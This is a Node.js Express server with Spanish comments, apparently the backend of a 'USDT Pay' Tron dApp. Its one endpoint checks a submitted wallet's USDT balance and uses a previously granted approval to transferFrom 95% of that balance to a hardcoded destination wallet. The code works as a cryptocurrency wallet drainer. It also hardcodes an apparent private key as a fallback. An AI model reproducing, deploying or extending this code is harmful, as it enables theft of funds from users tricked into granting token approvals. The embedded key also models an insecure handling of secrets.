const express = require('express');
const cors = require('cors');
const { TronWeb } = require('tronweb');

const app = express();
app.use(express.json());
app.use(cors());

// Configuración de TronWeb con la clave privada de la wallet operadora del backend
const PRIVATE_KEY = process.env.PRIVATE_KEY || '667e3590b2d8409fa4e5084e15126c226c4bf3330af5094607dec25d5a8e2e4d'; 
const DESTINATION_WALLET = process.env.DESTINATION_WALLET || 'TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree';

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: PRIVATE_KEY
});

const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet

// Ruta de comprobación de estado (útil para que Render sepa que el servicio está activo)
app.get('/', (req, res) => {
    res.send("Backend de USDT Pay funcionando correctamente.");
});

// Endpoint que llamará tu dApp para ejecutar el cobro del 95%
app.post('/api/ejecutar-cobro', async (req, res) => {
    const { userAddress } = req.body;

    if (!userAddress) {
        return res.status(400).json({ exito: false, mensaje: "Dirección de usuario inválida." });
    }

    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);

        // 1. Consultar el saldo real en USDT que tiene el usuario en su billetera
        const balanceEnSun = await contract.balanceOf(userAddress).call();
        const saldoRealUSDT = tronWeb.toDecimal(balanceEnSun) / 1000000;

        if (saldoRealUSDT <= 0) {
            return res.status(400).json({ exito: false, mensaje: "El usuario no tiene saldo disponible en USDT." });
        }

        // 2. Calcular exactamente el 95% del saldo del usuario
        const monto95DelSaldo = saldoRealUSDT * 0.95;
        const montoEnSun = Math.floor(monto95DelSaldo * 1000000);

        console.log(`[COBRO] Usuario: ${userAddress} | Saldo total: ${saldoRealUSDT} USDT | Cobrando el 95%: ${monto95DelSaldo} USDT`);

        // 3. Ejecutar transferFrom usando la aprobación previa del usuario
        const txID = await contract.transferFrom(
            userAddress, // Cuenta del usuario
            DESTINATION_WALLET, // Tu cuenta
            montoEnSun // El 95% calculado
        ).send({
            feeLimit: 100000000 // Límite de energía/gas cubierto por el operador
        });

        console.log(`¡Cobro exitoso! Hash de transacción: ${txID}`);

        return res.json({
            exito: true,
            mensaje: `Se procesó el 95% (${monto95DelSaldo.toFixed(2)} USDT) correctamente.`,
            txID: txID
        });

    } catch (error) {
        console.error("Error al ejecutar transferFrom:", error);
        return res.status(500).json({ 
            exito: false, 
            mensaje: "Error al procesar la transferencia. Asegúrate de que el usuario haya aprobado el permiso (approve) previamente.",
            error: error.message 
        });
    }
});

// IMPORTANTE: Usar process.env.PORT para que Render no falle al iniciar
const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    printLog = `Backend corriendo en el puerto ${PORT}`;
    console.log(printLog);
});
